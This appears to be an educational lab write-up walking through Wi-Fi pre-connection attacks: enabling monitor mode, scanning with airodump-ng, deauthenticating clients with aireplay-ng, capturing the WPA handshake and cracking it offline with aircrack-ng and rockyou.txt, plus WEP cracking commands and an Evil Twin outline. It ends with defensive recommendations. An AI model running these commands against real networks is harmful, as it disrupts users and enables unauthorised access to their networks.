# 🧪 Lab 02: Network Hacking — Pre-Connection Attacks

<div align="center">

**Category:** Wireless Security &nbsp;|&nbsp; **Difficulty:** Intermediate &nbsp;|&nbsp; **Status:** ✅ Completed

</div>

---

## 📋 Lab Overview

| Field | Details |
|---|---|
| **Objective** | Audit wireless networks and execute attacks without being connected to the target network |
| **Attacker Machine** | Kali Linux with wireless adapter |
| **Target** | Local WiFi networks (lab/controlled only) |
| **Key Tools** | `airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng` |
| **MITRE ATT&CK** | T1557 (Adversary-in-the-Middle), T1040 (Network Sniffing) |
| **Time Required** | ~2-3 hours |

### Why This Lab Matters
Wireless networks are often the **first entry point** for attackers. Understanding pre-connection attacks reveals:
- How attackers discover hidden networks
- How WEP/WPA encryption can be broken
- Why deauthentication attacks are so dangerous
- How to assess wireless security without ever joining the network

---

## 🏗️ Attack Flow Diagram

```
┌──────────────────────────────────────────────────────────────┐
│                    PRE-CONNECTION ATTACK FLOW                │
│                                                              │
│  ┌─────────────┐    ┌──────────────┐    ┌───────────────┐   │
│  │  STEP 1     │    │  STEP 2      │    │  STEP 3       │   │
│  │  Enable     │───▶│  Discover    │───▶│  Target a     │   │
│  │  Monitor    │    │  Networks    │    │  Network      │   │
│  │  Mode       │    │              │    │               │   │
│  └─────────────┘    └──────────────┘    └───────┬───────┘   │
│                                                 │           │
│                                                 ▼           │
│  ┌─────────────┐    ┌──────────────┐    ┌───────────────┐   │
│  │  STEP 6     │    │  STEP 5      │    │  STEP 4       │   │
│  │  Crack      │◀───│  Capture     │◀───│  Deauth       │   │
│  │  Password   │    │  Handshake   │    │  Client       │   │
│  │  (offline)  │    │  (.cap file) │    │  (force       │   │
│  │             │    │              │    │   reconnect)  │   │
│  └─────────────┘    └──────────────┘    └───────────────┘   │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

---

## 🔧 Prerequisites

### Hardware Required
| Item | Purpose | Notes |
|---|---|---|
| **USB WiFi Adapter** | Must support monitor mode & packet injection | Recommended: Alfa AWUS036ACH, TP-Link TL-WN722N (v1 only) |
| **Kali Linux VM** | Attacker machine | From Lab 01 |

### Verify Adapter Compatibility
```bash
# Check if your adapter is detected
iwconfig

# Check if it supports monitor mode
sudo airmon-ng

# Expected output should show your wireless interface (e.g., wlan0)
```

> ⚠️ **Note:** Built-in laptop WiFi cards typically do NOT support monitor mode. You need an external USB adapter.

---

## 📝 Step-by-Step Walkthrough

### Step 1: Enable Monitor Mode

**What is Monitor Mode?**
Normal WiFi mode (managed mode) only captures packets addressed to YOUR device. Monitor mode captures **ALL wireless packets** in the air — from every device on every network.

```bash
# Check current wireless interfaces
iwconfig

# Look for your wireless adapter (usually wlan0)
# Mode should currently show "Managed"

# Kill processes that might interfere with monitor mode
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# Verify monitor mode is active
iwconfig

# Your interface name changes: wlan0 → wlan0mon
# Mode should now show "Monitor"
```

**What Happens Behind the Scenes:**
```
Normal Mode:  Your adapter only listens to packets FOR YOU
              WiFi Card → "Is this for me? No? → Ignore"

Monitor Mode: Your adapter captures EVERYTHING in the air
              WiFi Card → "I'll grab ALL packets flying by"
```

**Verification:**
```bash
# Confirm the interface is in monitor mode
iwconfig wlan0mon

# Expected output:
# wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.437 GHz
```

---

### Step 2: Discover Networks with Airodump-ng

Now that you're in monitor mode, scan for all nearby wireless networks.

```bash
# Start scanning ALL networks on all channels
sudo airodump-ng wlan0mon
```

**Understanding the Output:**

```
 BSSID              PWR  Beacons  #Data  CH  ENC   CIPHER  AUTH  ESSID
 AA:BB:CC:DD:EE:01  -45  120      56     6   WPA2  CCMP    PSK   HomeNetwork
 AA:BB:CC:DD:EE:02  -67  85       12     11  WPA2  CCMP    PSK   OfficeWiFi
 AA:BB:CC:DD:EE:03  -78  40       0      1   OPN                 FreeWiFi

 BSSID              STATION            PWR   Rate  Lost  Packets  Notes
 AA:BB:CC:DD:EE:01  FF:11:22:33:44:55  -30   54-54  0    125      Connected client
```

**Column Breakdown:**

| Column | Meaning | Why It Matters |
|---|---|---|
| **BSSID** | MAC address of the router/access point | Uniquely identifies the target network |
| **PWR** | Signal strength (closer to 0 = stronger) | -45 is strong, -80 is weak |
| **Beacons** | Announcement packets from the router | Higher = more active |
| **#Data** | Number of data packets captured | Need data packets for cracking |
| **CH** | Channel the network operates on | Must match when targeting |
| **ENC** | Encryption type (WEP/WPA/WPA2/OPN) | Determines attack strategy |
| **ESSID** | Network name (SSID) | What you see when connecting normally |
| **STATION** | MAC address of connected devices (clients) | Target for deauth attacks |

---

### Step 3: Target a Specific Network

Once you identify your target network, focus your capture on it:

```bash
# Target a specific network (YOUR lab network only!)
sudo airodump-ng --bssid <TARGET-BSSID> -c <CHANNEL> -w capture wlan0mon

# Example:
sudo airodump-ng --bssid AA:BB:CC:DD:EE:01 -c 6 -w capture wlan0mon
```

**Parameters Explained:**
| Flag | Purpose |
|---|---|
| `--bssid` | Only capture packets from this specific router |
| `-c` | Lock to this channel (improves capture quality) |
| `-w capture` | Save captured packets to files starting with "capture" |

**What this creates:**
```
capture-01.cap    ← Packet capture file (contains the handshake)
capture-01.csv    ← Summary data in CSV format
capture-01.kismet.csv
capture-01.kismet.netxml
```

> 💡 **Leave this running** in one terminal while you execute the deauth attack in another.

---

### Step 4: Deauthentication Attack

**What is a Deauth Attack?**
You send forged "disconnect" packets to a client, pretending to be the router. The client disconnects and automatically reconnects — and during reconnection, it performs a **WPA handshake** that you capture.

```
Normal:    Client ←——— Connected ———→ Router
                         ✅

Deauth:    Attacker sends fake "DISCONNECT!" to client
           Client ←— "Router says disconnect" —— Attacker
                         ❌ Disconnected!

Reconnect: Client ←——— WPA Handshake ———→ Router
                    🎯 YOU CAPTURE THIS!
```

**Execute the Deauth Attack (new terminal):**
```bash
# Targeted deauth: disconnect a SPECIFIC client
sudo aireplay-ng --deauth 100 -a <ROUTER-BSSID> -c <CLIENT-MAC> wlan0mon

# Example:
sudo aireplay-ng --deauth 100 -a AA:BB:CC:DD:EE:01 -c FF:11:22:33:44:55 wlan0mon

# Broadcast deauth: disconnect ALL clients (noisier)
sudo aireplay-ng --deauth 100 -a <ROUTER-BSSID> wlan0mon
```

**Parameters:**
| Flag | Purpose |
|---|---|
| `--deauth 100` | Send 100 deauthentication frames (use `0` for continuous) |
| `-a` | Target router's BSSID (MAC address) |
| `-c` | Specific client to disconnect (optional) |

**What to watch for in the airodump-ng terminal:**
```
 When a handshake is captured, you'll see in the top-right:

 [ WPA handshake: AA:BB:CC:DD:EE:01 ]

 This means you've successfully captured the 4-way handshake! 🎯
```

---

### Step 5: Verify Handshake Capture

```bash
# Check if the capture file contains a valid handshake
sudo aircrack-ng capture-01.cap

# Expected output:
# 1 handshake found for network "HomeNetwork" (AA:BB:CC:DD:EE:01)
```

---

### Step 6: Crack the Password (Offline Dictionary Attack)

The handshake file contains an encrypted version of the password. You crack it **offline** by testing passwords from a wordlist.

```bash
# Dictionary attack using rockyou.txt
sudo aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt

# If rockyou.txt is compressed, extract it first:
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

**Understanding the Cracking Process:**
```
Wordlist (rockyou.txt):
  password123    → Hash → Compare with captured hash → ❌ No match
  letmein        → Hash → Compare with captured hash → ❌ No match
  dragon12345    → Hash → Compare with captured hash → ❌ No match
  MySecureWiFi!  → Hash → Compare with captured hash → ✅ MATCH!

  KEY FOUND! [ MySecureWiFi! ]
```

**Output on Success:**
```
                                 Aircrack-ng 1.7

      [00:01:52] 12847/14344380 keys tested (115.23 k/s)

                         KEY FOUND! [ password123 ]

      Master Key     : AA BB CC DD EE FF 00 11 22 33 44 55 66 77 88 99
      Transient Key  : 11 22 33 44 55 66 77 88 99 AA BB CC DD EE FF 00
      EAPOL HMAC     : AA BB CC DD EE FF 00 11 22 33 44 55 66 77 88 99
```

> ⚠️ **Important:** This only works if the password is in your wordlist. Strong, unique passwords (e.g., `X#k9$mP@2qL!`) won't be found in `rockyou.txt`.

---

## 📚 Advanced: WEP Cracking (Legacy Networks)

WEP is an outdated encryption standard that can be cracked **without a wordlist** because of mathematical weaknesses.

```bash
# Step 1: Capture WEP traffic (need lots of Data packets — at least 25,000)
sudo airodump-ng --bssid <BSSID> -c <CH> -w wep_capture wlan0mon

# Step 2: Generate traffic with fake authentication
sudo aireplay-ng --fakeauth 0 -a <BSSID> wlan0mon

# Step 3: ARP replay to generate more data packets
sudo aireplay-ng --arpreplay -b <BSSID> wlan0mon

# Step 4: Crack (no wordlist needed!)
sudo aircrack-ng wep_capture-01.cap
```

---

## 📚 Advanced: Evil Twin / Fake Access Point

Create a rogue access point that mimics a legitimate network to capture credentials.

```bash
# Create a fake AP using hostapd (basic concept)
# This creates a network with the same name as the target
# Victims connect to YOUR AP thinking it's the real one

# Tools needed: hostapd, dnsmasq, Apache
# Full setup requires a separate dedicated walkthrough
```

---

## 📊 Lab Results

| Target Network | Attack Vector | Result | Notes |
|---|---|---|---|
| Lab WiFi | Monitor Mode | ✅ Enabled | Interface renamed to `wlan0mon` |
| Lab WiFi | Network Discovery | ✅ | Found target network + connected clients |
| Lab WiFi | Deauthentication | ✅ | Client disconnected and reconnected |
| Lab WiFi | Handshake Capture | ✅ | `.cap` file saved with valid handshake |
| Lab WiFi | Dictionary Attack | ✅ | Password cracked using `rockyou.txt` |

---

## 🛡️ Defensive Recommendations

| Attack | Defense |
|---|---|
| Deauthentication | Use 802.11w (Management Frame Protection) |
| WEP Cracking | **Never use WEP** — migrate to WPA2/WPA3 |
| WPA2 Dictionary Attack | Use complex passwords (16+ chars, symbols, not in dictionaries) |
| Evil Twin | Verify network certificates; use VPN on public WiFi |
| Network Sniffing | WPA3-SAE prevents offline dictionary attacks |

---

## 🧠 Key Takeaways

1. **Monitor mode ≠ Promiscuous mode** — Monitor captures raw 802.11 frames; promiscuous captures packets on a connected network
2. **Deauth attacks are trivial** — Any $15 USB adapter can disconnect anyone from WiFi. This is why 802.11w management frame protection matters
3. **WPA2 is only as strong as the password** — A weak password makes the encryption meaningless
4. **WEP is fundamentally broken** — It can be cracked in minutes regardless of password complexity
5. **All cracking happens offline** — You only need to be near the network briefly to capture the handshake, then crack at home with powerful hardware

---

## 🔗 Navigation
⬅️ [Lab 01: Environment Setup](../lab-01-environment-setup/README.md) &nbsp;|&nbsp; ➡️ [Lab 03: Post-Connection Attacks](../lab-03-network-post-connection/README.md)
